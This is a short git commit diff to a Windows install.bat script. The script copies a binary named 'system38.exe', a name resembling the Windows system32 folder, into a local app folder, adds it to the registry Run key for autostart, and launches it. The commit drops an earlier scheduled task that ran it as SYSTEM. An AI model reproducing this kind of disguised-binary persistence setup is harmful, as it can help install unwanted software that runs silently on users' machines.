decc7b4d4fcc4819d5dbbfb59f58df2b07a1ae8d
itsAlirezaYT <ytvision.compani@gmail.com>
2025-10-18 06:31:13 -0700

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,9 +1,8 @@
 @echo off
 setlocal
-set "TARGET=C:\ProgramData\MyApp"
+set "TARGET=%LOCALAPPDATA%\MyApp"
 set "EXENAME=system38.exe"
 if not exist "%TARGET%" mkdir "%TARGET%"
 copy /Y "%~dp0%EXENAME%" "%TARGET%\%EXENAME%"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyApp" /t REG_SZ /d "%TARGET%\%EXENAME%" /f
-schtasks /create /tn "MyAppStartup" /tr "%TARGET%\%EXENAME%" /sc onstart /ru SYSTEM /f
 start "" "%TARGET%\%EXENAME%"
